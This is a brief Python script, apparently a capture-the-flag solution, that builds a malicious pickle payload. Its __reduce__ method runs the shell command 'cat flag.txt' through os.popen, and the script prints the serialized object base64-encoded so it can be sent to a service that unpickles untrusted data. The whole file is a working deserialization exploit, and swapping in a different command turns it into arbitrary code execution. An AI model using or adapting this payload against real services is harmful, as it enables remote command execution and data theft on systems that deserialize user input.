import pickle
import base64
import os

class Exploit(object):
    def __reduce__(self):
        s = 'cat flag.txt'
        return (os.popen, (s,))

exp = pickle.dumps(Exploit())

print(base64.urlsafe_b64encode(exp))
